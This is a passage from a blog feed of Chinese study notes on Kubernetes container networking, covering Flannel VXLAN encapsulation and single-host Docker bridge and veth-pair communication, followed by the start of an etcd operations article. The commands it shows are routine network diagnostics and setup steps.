Header字段，得到一个二层数据帧。</p><p>需要注意的是，上述封包过程只是加一个二层头，不会改变“原始IP包”的内容。所以图中的Inner IP Header字段，依然是container-2的IP地址，即10.1.16.3。</p><p>但是，上面提到的这些VTEP设备的MAC地址，对于宿主机网络来说并没有什么实际意义。所以上面封装出来的这个数据帧，并不能在我们的宿主机二层网络里传输。为了方便叙述，我们把它称为“内部数据帧”（Inner Ethernet Frame）。</p><p>所以接下来，Linux内核还需要再把“内部数据帧”进一步封装成为宿主机网络里的一个普通的数据帧，好让它“载着”“内部数据帧”，通过宿主机的eth0网卡进行传输。</p><p>这次要封装出来的、宿主机对应的数据帧称为“<strong>外部数据帧</strong>”（Outer Ethernet Frame）。</p><p>为了实现这个“搭便车”的机制，Linux内核会在“内部数据帧”前面，加上一个特殊的VXLAN头，用来表示这个“乘客”实际上是一个VXLAN要使用的数据帧。</p><p>而这个VXLAN头里有一个重要的标志叫作 <strong>VNI</strong>，它是VTEP设备识别某个数据帧是不是应该归自己处理的重要标识。而在Flannel中，VNI的默认值是1，这也是为何，宿主机上的VTEP设备都叫作flannel.1的原因，这里的“1”，其实就是VNI的值。</p><p><strong>然后，Linux内核会把这个数据帧封装进一个UDP包里发出去。</strong></p><p>所以，跟UDP模式类似，在宿主机看来，它会以为自己的flannel.1设备只是在向另外一台宿主机的flannel.1设备，发起了一次普通的UDP链接。它哪里会知道，这个UDP包里面，其实是一个完整的二层数据帧。这是不是跟特洛伊木马的故事非常像呢？</p><p>不过，不要忘了，一个flannel.1设备只知道另一端的flannel.1设备的MAC地址，却不知道对应的宿主机地址是什么。</p><p>也就是说，这个UDP包该发给哪台宿主机呢？</p><p>在这种场景下，flannel.1设备实际上要扮演一个“网桥”的角色，在二层网络进行UDP包的转发。而在Linux内核里面，“网桥”设备进行转发的依据，来自于一个叫作FDB（Forwarding Database）的转发数据库。</p><p>不难想到，这个flannel.1“网桥”对应的FDB信息，也是flanneld进程负责维护的。它的内容可以通过bridge fdb命令查看到，如下所示：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-comment"># 在Node 1上，使用“目的VTEP设备”的MAC地址进行查询</span><br><span class="hljs-variable">$ </span>bridge fdb show flannel.<span class="hljs-number">1</span> | grep <span class="hljs-number">5</span><span class="hljs-symbol">e:</span><span class="hljs-symbol">f8:</span><span class="hljs-number">4</span><span class="hljs-symbol">f:</span><span class="hljs-number">00</span><span class="hljs-symbol">:e3</span><span class="hljs-symbol">:</span><span class="hljs-number">37</span><br><span class="hljs-number">5</span><span class="hljs-symbol">e:</span><span class="hljs-symbol">f8:</span><span class="hljs-number">4</span><span class="hljs-symbol">f:</span><span class="hljs-number">00</span><span class="hljs-symbol">:e3</span><span class="hljs-symbol">:</span><span class="hljs-number">37</span> dev flannel.<span class="hljs-number">1</span> dst <span class="hljs-number">10.168</span>.<span class="hljs-number">0.3</span> self permanent<br><br></code></pre></td></tr></table></figure><p>可以看到，在上面这条FDB记录里，指定了这样一条规则，即：</p><p>发往我们前面提到的“目的VTEP设备”（MAC地址是5e:f8:4f:00:e3:37）的二层数据帧，应该通过flannel.1设备，发往IP地址为10.168.0.3的主机。显然，这台主机正是Node 2，UDP包要发往的目的地就找到了。</p><p>所以 <strong>接下来的流程，就是一个正常的、宿主机网络上的封包工作。</strong></p><p>我们知道，UDP包是一个四层数据包，所以Linux内核会在它前面加上一个IP头，即原理图中的Outer IP Header，组成一个IP包。并且，在这个IP头里，会填上前面通过FDB查询出来的目的主机的IP地址，即Node 2的IP地址10.168.0.3。</p><p>然后，Linux内核再在这个IP包前面加上二层数据帧头，即原理图中的Outer Ethernet Header，并把Node 2的MAC地址填进去。这个MAC地址本身，是Node 1的ARP表要学习的内容，无需Flannel维护。这时候，我们封装出来的“外部数据帧”的格式，如下所示：</p><p><img src="https://static001.geekbang.org/resource/image/8c/85/8cede8f74a57617494027ba137383f85.jpg?wh=1864*192" alt="img"></p><p>这样，封包工作就宣告完成了。</p><p>接下来，Node 1上的flannel.1设备就可以把这个数据帧从Node 1的eth0网卡发出去。显然，这个帧会经过宿主机网络来到Node 2的eth0网卡。</p><p>这时候，Node 2的内核网络栈会发现这个数据帧里有VXLAN Header，并且VNI&#x3D;1。所以Linux内核会对它进行拆包，拿到里面的内部数据帧，然后根据VNI的值，把它交给Node 2上的flannel.1设备。</p><p>而flannel.1设备则会进一步拆包，取出“原始IP包”。接下来就回到了之前分享的单机容器网络的处理流程。最终，IP包就进入到了container-2容器的Network Namespace里。</p><p>以上，就是Flannel VXLAN模式的具体工作原理了。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在本篇文章中，详细讲解了Flannel UDP和VXLAN模式的工作原理。这两种模式其实都可以称作“隧道”机制，也是很多其他容器网络插件的基础。比如Weave的两种模式，以及Docker的Overlay模式。</p><p>此外，从上面的讲解中我们可以看到，VXLAN模式组建的覆盖网络，其实就是一个由不同宿主机上的VTEP设备，也就是flannel.1设备组成的虚拟二层网络。对于VTEP设备来说，它发出的“内部数据帧”就仿佛是一直在这个虚拟的二层网络上流动。这，也正是覆盖网络的含义。</p><blockquote><p>备注：如果你想要在我们前面部署的集群中实践Flannel的话，可以在Master节点上执行如下命令来替换网络插件。</p><p>第一步，执行 <code>$ rm -rf /etc/cni/net.d/*</code>；</p><p>第二步，执行 <code>$ kubectl delete -f &quot;https://cloud.weave.works/k8s/net?k8s-version=1.11&quot;</code>；</p><p>第三步，在 <code>/etc/kubernetes/manifests/kube-controller-manager.yaml</code> 里，为容器启动命令添加如下两个参数：</p><p><code>--allocate-node-cidrs=true</code></p><p><code>--cluster-cidr=10.244.0.0/16</code></p><p>第四步， 重启所有kubelet；</p><p>第五步， 执行 <code>$ kubectl create -f https://raw.githubusercontent.com/coreos/flannel/bc79dd1505b0c8681ece4de4c0d86c5cd2643275/Documentation/kube-flannel.yml</code>。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Kubernetes</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>Kubernetes</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>浅谈容器网络--单节点容器通信</title>
    <link href="/2022/10/24/%E6%B5%85%E8%B0%88%E5%AE%B9%E5%99%A8%E7%BD%91%E7%BB%9C-%E5%8D%95%E8%8A%82%E7%82%B9%E5%AE%B9%E5%99%A8%E9%80%9A%E4%BF%A1/"/>
    <url>/2022/10/24/%E6%B5%85%E8%B0%88%E5%AE%B9%E5%99%A8%E7%BD%91%E7%BB%9C-%E5%8D%95%E8%8A%82%E7%82%B9%E5%AE%B9%E5%99%A8%E9%80%9A%E4%BF%A1/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"># 浅谈容器网络--单节点容器通信<blockquote><p>本文笔记来自：「深入剖析 Kubernetes课程」，原文链接：<a href="https://time.geekbang.org/column/article/64948">https://time.geekbang.org/column/article/64948</a></p></blockquote><p>所谓“网络栈”，包括了：<strong>网卡（Network Interface）、回环设备（Loopback Device）、路由表（Routing Table）和iptables规则</strong>。对于一个进程来说，这些要素，构成了它发起和响应网络请求的基本环境。</p><p>需要指出的是，作为一个容器，它可以声明直接使用宿主机的网络栈（–net&#x3D;host），即：不开启Network Namespace，比如：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ docker <span class="hljs-built_in">run</span> –d –<span class="hljs-attribute">net</span>=host --name nginx-host nginx<br></code></pre></td></tr></table></figure><p>在这种情况下，这个容器启动后，直接监听的就是宿主机的80端口。</p><p>像这样直接使用宿主机网络栈的方式，虽然可以为容器提供良好的网络性能，但也会不可避免地引入共享网络资源的问题，比如端口冲突。所以， <strong>在大多数情况下，我们都希望容器进程能使用自己Network Namespace里的网络栈，即：拥有属于自己的IP地址和端口。</strong></p><p>这时候，一个显而易见的问题就是：这个被隔离的容器进程，该如何跟其他Network Namespace里的容器进程进行交互呢？</p><p>为了理解这个问题，可以把每一个容器看做一台主机，它们都有一套独立的“网络栈”。</p><p>如果想要实现两台主机之间的通信，最直接的办法，就是把它们用一根网线连接起来；而如果你想要实现多台主机之间的通信，那就需要用网线，把它们连接在一台交换机上。</p><p>在Linux中，能够起到虚拟交换机作用的网络设备，是网桥（Bridge）。它是一个工作在数据链路层（Data Link）的设备，主要功能是根据MAC地址学习来将数据包转发到网桥的不同端口（Port）上。</p><p>·至于为什么这些主机之间需要MAC地址才能进行通信，这就是网络分层模型的基础知识了。不熟悉这块可以通过 <a href="https://www.lifewire.com/layers-of-the-osi-model-illustrated-818017">这篇文章</a> 来学习一下。</p><p>而为了实现上述目的，Docker项目会默认在宿主机上创建一个名叫docker0的网桥，凡是连接在docker0网桥上的容器，就可以通过它来进行通信。</p><p>可是，又该如何把这些容器“连接”到docker0网桥上呢？</p><p>这时候，我们就需要使用一种名叫 <strong>Veth Pair</strong> 的虚拟设备了。</p><p>Veth Pair设备的特点是：它被创建出来后，总是以两张虚拟网卡（Veth Peer）的形式成对出现的。并且，从其中一个“网卡”发出的数据包，可以直接出现在与它对应的另一张“网卡”上，哪怕这两个“网卡”在不同的Network Namespace里。</p><p>这就使得Veth Pair常常被用作连接不同Network Namespace 的“网线”。</p><p>比如，现在我们启动了一个叫作nginx-1的容器：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">$ docker <span class="hljs-built_in">run</span> –d <span class="hljs-comment">--name nginx-1 nginx</span><br><br></code></pre></td></tr></table></figure><p>然后进入到这个容器中查看一下它的网络设备：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs tap"><span class="hljs-comment"># 在宿主机上</span><br>$ docker exec -it nginx-1 /bin/bash<br><span class="hljs-comment"># 在容器里</span><br>root@2b3c181aecf1:/<span class="hljs-comment"># ifconfig</span><br>eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500<br>        inet 172.17.0.2  netmask 255.255.0.0  broadcast 0.0.0.0<br>        inet6 fe80::42:acff:fe11:2  prefixlen<span class="hljs-number"> 64 </span> scopeid 0x20&lt;link&gt;<br>        ether 02:42:ac:11:00:02  txqueuelen<span class="hljs-number"> 0 </span> (Ethernet)<br>        RX packets<span class="hljs-number"> 364 </span> bytes<span class="hljs-number"> 8137175 </span>(7.7 MiB)<br>        RX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span> overruns<span class="hljs-number"> 0 </span> frame 0<br>        TX packets<span class="hljs-number"> 281 </span> bytes<span class="hljs-number"> 21161 </span>(20.6 KiB)<br>        TX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span>overruns<span class="hljs-number"> 0 </span> carrier<span class="hljs-number"> 0 </span> collisions 0<br><br>lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536<br>        inet 127.0.0.1  netmask 255.0.0.0<br>        inet6 ::1  prefixlen<span class="hljs-number"> 128 </span> scopeid 0x10&lt;host&gt;<br>        loop  txqueuelen<span class="hljs-number"> 1000 </span> (Local Loopback)<br>        RX packets<span class="hljs-number"> 0 </span> bytes<span class="hljs-number"> 0 </span>(0.0 B)<br>        RX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span> overruns<span class="hljs-number"> 0 </span> frame 0<br>        TX packets<span class="hljs-number"> 0 </span> bytes<span class="hljs-number"> 0 </span>(0.0 B)<br>        TX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span>overruns<span class="hljs-number"> 0 </span> carrier<span class="hljs-number"> 0 </span> collisions 0<br><br>$ route<br>Kernel IP routing table<br>Destination     Gateway         Genmask         Flags Metric Ref    Use Iface<br>default         172.17.0.1      0.0.0.0         UG   <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 0 </span>eth0<br>172.17.0.0      0.0.0.0         255.255.0.0     U    <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 0 </span>eth0<br><br></code></pre></td></tr></table></figure><p>可以看到，这个容器里有一张叫作eth0的网卡，它正是一个Veth Pair设备在容器里的这一端。</p><p>通过route命令查看nginx-1容器的路由表，我们可以看到，这个eth0网卡是这个容器里的默认路由设备；所有对172.17.0.0&#x2F;16网段的请求，也会被交给eth0来处理（第二条172.17.0.0路由规则）。</p><p>而这个Veth Pair设备的另一端，则在宿主机上。你可以通过查看宿主机的网络设备看到它，如下所示：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs vim"># 在宿主机上<br>$ ifconfig<br>...<br>docker0   Link encap:Ethernet  HWaddr <span class="hljs-number">02</span>:<span class="hljs-number">42</span>:d8:e4:df:c1<br>          inet addr:<span class="hljs-number">172.17</span>.<span class="hljs-number">0.1</span>  Bcas<span class="hljs-variable">t:0</span>.<span class="hljs-number">0.0</span>.<span class="hljs-number">0</span>  Mask:<span class="hljs-number">255.255</span>.<span class="hljs-number">0.0</span><br>          inet6 addr: fe80::<span class="hljs-number">42</span>:d8ff:fee4:dfc1/<span class="hljs-number">64</span> Scope:Link<br>          UP BROADCAST RUNNING MULTICAST  MTU:<span class="hljs-number">1500</span>  Metric:<span class="hljs-number">1</span><br>          RX packet<span class="hljs-variable">s:309</span> error<span class="hljs-variable">s:0</span> dropped:<span class="hljs-number">0</span> overrun<span class="hljs-variable">s:0</span> frame:<span class="hljs-number">0</span><br>          TX packet<span class="hljs-variable">s:372</span> error<span class="hljs-variable">s:0</span> dropped:<span class="hljs-number">0</span> overrun<span class="hljs-variable">s:0</span> carrier:<span class="hljs-number">0</span><br> collision<span class="hljs-variable">s:0</span> txqueuelen:<span class="hljs-number">0</span><br>          RX byte<span class="hljs-variable">s:18944</span> (<span class="hljs-number">18.9</span> KB)  TX byte<span class="hljs-variable">s:8137789</span> (<span class="hljs-number">8.1</span> MB)<br>veth9c02e56 Link encap:Ethernet  HWaddr <span class="hljs-number">52</span>:<span class="hljs-number">81</span>:<span class="hljs-number">0</span><span class="hljs-variable">b:24</span>:<span class="hljs-number">3</span>d:da<br>          inet6 addr: fe80::<span class="hljs-number">5081</span>:bff:fe24:<span class="hljs-number">3</span>dda/<span class="hljs-number">64</span> Scope:Link<br>          UP BROADCAST RUNNING MULTICAST  MTU:<span class="hljs-number">1500</span>  Metric:<span class="hljs-number">1</span><br>          RX packet<span class="hljs-variable">s:288</span> error<span class="hljs-variable">s:0</span> dropped:<span class="hljs-number">0</span> overrun<span class="hljs-variable">s:0</span> frame:<span class="hljs-number">0</span><br>          TX packet<span class="hljs-variable">s:371</span> error<span class="hljs-variable">s:0</span> dropped:<span class="hljs-number">0</span> overrun<span class="hljs-variable">s:0</span> carrier:<span class="hljs-number">0</span><br> collision<span class="hljs-variable">s:0</span> txqueuelen:<span class="hljs-number">0</span><br>          RX byte<span class="hljs-variable">s:21608</span> (<span class="hljs-number">21.6</span> KB)  TX byte<span class="hljs-variable">s:8137719</span> (<span class="hljs-number">8.1</span> MB)<br><br>$ brctl show<br>bridge name bridge id  STP enabled interfaces<br>docker0  <span class="hljs-number">8000.0242</span>d8e4dfc1 <span class="hljs-keyword">no</span>  veth9c02e56<br><br></code></pre></td></tr></table></figure><p>通过ifconfig命令的输出，可以看到，nginx-1容器对应的Veth Pair设备，在宿主机上是一张虚拟网卡。它的名字叫作veth9c02e56。并且，通过brctl show的输出，可以看到这张网卡被“插”在了docker0上。</p><p>这时候，如果再在这台宿主机上启动另一个Docker容器，比如nginx-2：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ docker <span class="hljs-built_in">run</span> –d --name nginx-2 nginx<br>$ brctl show<span class="hljs-built_in"></span><br><span class="hljs-built_in">bridge </span>name<span class="hljs-built_in"> bridge </span>id  STP enabled interfaces<br>docker0  8000.0242d8e4dfc1 <span class="hljs-literal">no</span>  veth9c02e56<br>       vethb4963f3<br><br></code></pre></td></tr></table></figure><p>就会发现一个新的、名叫vethb4963f3的虚拟网卡，也被“插”在了docker0网桥上。</p><p>这时候，如果在nginx-1容器里ping一下nginx-2容器的IP地址（172.17.0.3），就会发现同一宿主机上的两个容器默认就是相互连通的。</p><p>这其中的原理其实非常简单。</p><p>当你在nginx-1容器里访问nginx-2容器的IP地址（比如ping 172.17.0.3）的时候，这个目的IP地址会匹配到nginx-1容器里的第二条路由规则。可以看到，这条路由规则的网关（Gateway）是0.0.0.0，这就意味着这是一条直连规则，即：凡是匹配到这条规则的IP包，应该经过本机的eth0网卡，通过二层网络直接发往目的主机。</p><p>而要通过二层网络到达nginx-2容器，就需要有172.17.0.3这个IP地址对应的MAC地址。所以nginx-1容器的网络协议栈，就需要通过eth0网卡发送一个ARP广播，来通过IP地址查找对应的MAC地址。</p><blockquote><p>备注：ARP（Address Resolution Protocol），是通过三层的IP地址找到对应的二层MAC地址的协议。</p></blockquote><p>这个eth0网卡，是一个Veth Pair，它的一端在这个nginx-1容器的Network Namespace里，而另一端则位于宿主机上（Host Namespace），并且被“插”在了宿主机的docker0网桥上。</p><p>一旦一张虚拟网卡被“插”在网桥上，它就会变成该网桥的“从设备”。从设备会被“剥夺”调用网络协议栈处理数据包的资格，从而“降级”成为网桥上的一个端口。而这个端口唯一的作用，就是接收流入的数据包，然后把这些数据包的“生杀大权”（比如转发或者丢弃），全部交给对应的网桥。</p><p>所以，在收到这些ARP请求之后，docker0网桥就会扮演二层交换机的角色，把ARP广播转发到其他被“插”在docker0上的虚拟网卡上。这样，同样连接在docker0上的nginx-2容器的网络协议栈就会收到这个ARP请求，从而将172.17.0.3所对应的MAC地址回复给nginx-1容器。</p><p>有了这个目的MAC地址，nginx-1容器的eth0网卡就可以将数据包发出去。</p><p>而根据Veth Pair设备的原理，这个数据包会立刻出现在宿主机上的veth9c02e56虚拟网卡上。不过，此时这个veth9c02e56网卡的网络协议栈的资格已经被“剥夺”，所以这个数据包就直接流入到了docker0网桥里。</p><p>docker0处理转发的过程，则继续扮演二层交换机的角色。此时，docker0网桥根据数据包的目的MAC地址（也就是nginx-2容器的MAC地址），在它的CAM表（即交换机通过MAC地址学习维护的端口和MAC地址的对应表）里查到对应的端口（Port）为：vethb4963f3，然后把数据包发往这个端口。</p><p>而这个端口，正是nginx-2容器“插”在docker0网桥上的另一块虚拟网卡，当然，它也是一个Veth Pair设备。这样，数据包就进入到了nginx-2容器的Network Namespace里。</p><p>所以，nginx-2容器看到的情况是，它自己的eth0网卡上出现了流入的数据包。这样，nginx-2的网络协议栈就会对请求进行处理，最后将响应（Pong）返回到nginx-1。</p><p>以上，就是同一个宿主机上的不同容器通过docker0网桥进行通信的流程了。我把这个流程总结成了一幅示意图，如下所示：</p><p><img src="https://static001.geekbang.org/resource/image/e0/66/e0d28e0371f93af619e91a86eda99a66.png?wh=1715*995" alt="img"></p><p>需要注意的是，在实际的数据传递时，上述数据的传递过程在网络协议栈的不同层次，都有Linux内核Netfilter参与其中。所以，可以通过打开iptables的TRACE功能查看到数据包的传输过程，具体方法如下所示：</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-meta"># 在宿主机上执行</span><br>$ iptables -t raw -A <span class="hljs-keyword">OUTPUT</span> -p icmp -j <span class="hljs-keyword">TRACE</span><br>$ iptables -t raw -A PREROUTING -p icmp -j <span class="hljs-keyword">TRACE</span><br><br></code></pre></td></tr></table></figure><p>通过上述设置，就可以在&#x2F;var&#x2F;log&#x2F;syslog里看到数据包传输的日志了。这一部分内容，可以结合 <a href="https://en.wikipedia.org/wiki/Iptables">iptables的相关知识</a> 进行实践，从而验证数据包传递流程。</p><p>熟悉了docker0网桥的工作方式，就可以理解，在默认情况下， <strong>被限制在Network Namespace里的容器进程，实际上是通过Veth Pair设备+宿主机网桥的方式，实现了跟同其他容器的数据交换。</strong></p><p>与之类似地，当在一台宿主机上，访问该宿主机上的容器的IP地址时，这个请求的数据包，也是先根据路由规则到达docker0网桥，然后被转发到对应的Veth Pair设备，最后出现在容器里。这个过程的示意图，如下所示：</p><p><img src="https://static001.geekbang.org/resource/image/9f/01/9fb381d1e49318bb6a67bda3f9db6901.png?wh=1715*995" alt="img"></p><p>同样地，当一个容器试图连接到另外一个宿主机时，比如：ping 10.168.0.3，它发出的请求数据包，首先经过docker0网桥出现在宿主机上。然后根据宿主机的路由表里的直连路由规则（10.168.0.0&#x2F;24 via eth0)），对10.168.0.3的访问请求就会交给宿主机的eth0处理。</p><p>所以接下来，这个数据包就会经宿主机的eth0网卡转发到宿主机网络上，最终到达10.168.0.3对应的宿主机上。当然，这个过程的实现要求这两台宿主机本身是连通的。这个过程的示意图，如下所示：</p><p><img src="https://static001.geekbang.org/resource/image/90/95/90bd630c0723ea8a1fb7ccd738ad1f95.png?wh=1834*994" alt="img"></p><p>所以说， <strong>当遇到容器连不通“外网”的时候，都应该先试试docker0网桥能不能ping通，然后查看一下跟docker0和Veth Pair设备相关的iptables规则是不是有异常，往往就能够找到问题的答案了。</strong></p><p>不过，在最后一个“Docker容器连接其他宿主机”的例子里，如果在另外一台宿主机（比如：10.168.0.3）上，也有一个Docker容器。那么，nginx-1容器又该如何访问它呢？</p><p>这个问题，其实就是容器的“<strong>跨主通信</strong>”问题。</p><p>在Docker的默认配置下，一台宿主机上的docker0网桥，和其他宿主机上的docker0网桥，没有任何关联，它们互相之间也没办法连通。所以，连接在这些网桥上的容器，自然也没办法进行通信了。</p><p>不过，万变不离其宗。</p><p>如果我们通过软件的方式，创建一个整个集群“公用”的网桥，然后把集群里的所有容器都连接到这个网桥上，不就可以相互通信了吗？</p><p>说得没错。</p><p>这样一来，我们整个集群里的容器网络就会类似于下图所示的样子：</p><p><img src="https://static001.geekbang.org/resource/image/b4/3d/b4387a992352109398a66d1dbe6e413d.png?wh=1828*721" alt="img"></p><p>可以看到，构建这种容器网络的核心在于：我们需要在已有的宿主机网络上，再通过软件构建一个覆盖在已有宿主机网络之上的、可以把所有容器连通在一起的虚拟网络。所以，这种技术就被称为：Overlay Network（覆盖网络）。</p><p>而这个Overlay Network本身，可以由每台宿主机上的一个“特殊网桥”共同组成。比如，当Node 1上的Container 1要访问Node 2上的Container 3的时候，Node 1上的“特殊网桥”在收到数据包之后，能够通过某种方式，把数据包发送到正确的宿主机，比如Node 2上。而Node 2上的“特殊网桥”在收到数据包后，也能够通过某种方式，把数据包转发给正确的容器，比如Container 3。</p><p>甚至，每台宿主机上，都不需要有一个这种特殊的网桥，而仅仅通过某种方式配置宿主机的路由表，就能够把数据包转发到正确的宿主机上。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在今天这篇文章中，介绍了在本地环境下，单机容器网络的实现原理和docker0网桥的作用。</p><p>这里的关键在于，容器要想跟外界进行通信，它发出的IP包就必须从它的Network Namespace里出来，来到宿主机上。</p><p>而解决这个问题的方法就是：为容器创建一个一端在容器里充当默认网卡、另一端在宿主机上的Veth Pair设备。</p><h2 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h2><p>尽管容器的Host Network模式有一些缺点，但是它性能好、配置简单，并且易于调试，所以很多团队会直接使用Host Network。那么，如果要在生产环境中使用容器的Host Network模式，需要做哪些额外的准备工作？</p><p>使用host网络，要提前规划好每个服务应该使用的端口吧</p>]]></content>
    
    
    <categories>
      
      <category>Kubernetes</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>Kubernetes</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>分布式存储系统核心知识点</title>
    <link href="/2022/10/16/%E5%88%86%E5%B8%83%E5%BC%8F%E5%AD%98%E5%82%A8%E7%B3%BB%E7%BB%9F%E6%A0%B8%E5%BF%83%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    <url>/2022/10/16/%E5%88%86%E5%B8%83%E5%BC%8F%E5%AD%98%E5%82%A8%E7%B3%BB%E7%BB%9F%E6%A0%B8%E5%BF%83%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<h1 id="分布式存储系统核心知识点"><a href="#分布式存储系统核心知识点" class="headerlink" title="分布式存储系统核心知识点"></a>分布式存储系统核心知识点</h1><p><img src="https://static001.geekbang.org/resource/image/7b/28/7b54b6ca9134c130bf3940c7db497928.png?wh=1920*1177" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>分布式存储</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
      <tag>分布式存储</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>24.运维：如何构建高可靠的etcd集群运维体系？</title>
    <link href="/2022/10/16/24-%E8%BF%90%E7%BB%B4%EF%BC%9A%E5%A6%82%E4%BD%95%E6%9E%84%E5%BB%BA%E9%AB%98%E5%8F%AF%E9%9D%A0%E7%9A%84etcd%E9%9B%86%E7%BE%A4%E8%BF%90%E7%BB%B4%E4%BD%93%E7%B3%BB%EF%BC%9F/"/>
    <url>/2022/10/16/24-%E8%BF%90%E7%BB%B4%EF%BC%9A%E5%A6%82%E4%BD%95%E6%9E%84%E5%BB%BA%E9%AB%98%E5%8F%AF%E9%9D%A0%E7%9A%84etcd%E9%9B%86%E7%BE%A4%E8%BF%90%E7%BB%B4%E4%BD%93%E7%B3%BB%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="24-运维：如何构建高可靠的etcd集群运维体系？"><a href="#24-运维：如何构建高可靠的etcd集群运维体系？" class="headerlink" title="24.运维：如何构建高可靠的etcd集群运维体系？"></a>24.运维：如何构建高可靠的etcd集群运维体系？</h1><blockquote><p>本文笔记来自：「极客时间ETCD实战课」，原文链接：<a href="https://time.geekbang.org/column/article/354292?cid=100069901">https://time.geekbang.org/column/article/354292?cid=100069901</a></p></blockquote><p>在使用etcd过程中，我们经常会面临着一系列问题与选择，比如：</p><ul><li>etcd是使用虚拟机还是容器部署，各有什么优缺点？</li><li>如何及时发现etcd集群隐患项（比如数据不一致）？</li><li>如何及时监控及告警etcd的潜在隐患（比如db大小即将达到配额）？</li><li>如何优雅的定时、甚至跨城备份etcd数据？</li><li>如何模拟磁盘IO等异常来复现Bug、故障？</li></ul><p>今天聊聊如何解决以上问题。接下来将通过从etcd集群部署、集群组建、监控体系、巡检、备份及还原、高可用、混沌工程等维度，带你了解如何构建一个高可靠的etcd集群运维体系。</p><h2 id="整体解决方案"><a href="#整体解决方案" class="headerlink" title="整体解决方案"></a>整体解决方案</h2><p>那要如何构建高可靠的etcd集群运维体系呢?</p><p>通过下面这个思维脑图给你总结了etcd运维体系建设核心要点，它由etcd集群部署、成员管理、监控及告警体系、备份及还原、巡检、高可用及自愈、混沌工程等维度组成。</p><p><img src="https://static001.geekbang.org/resource/image/80/c2/803b20362b21d13396ee099f413968c2.png?wh=1920*1409" alt="img"></p><h2 id="集群部署"><a href="#集群部署" class="headerlink" 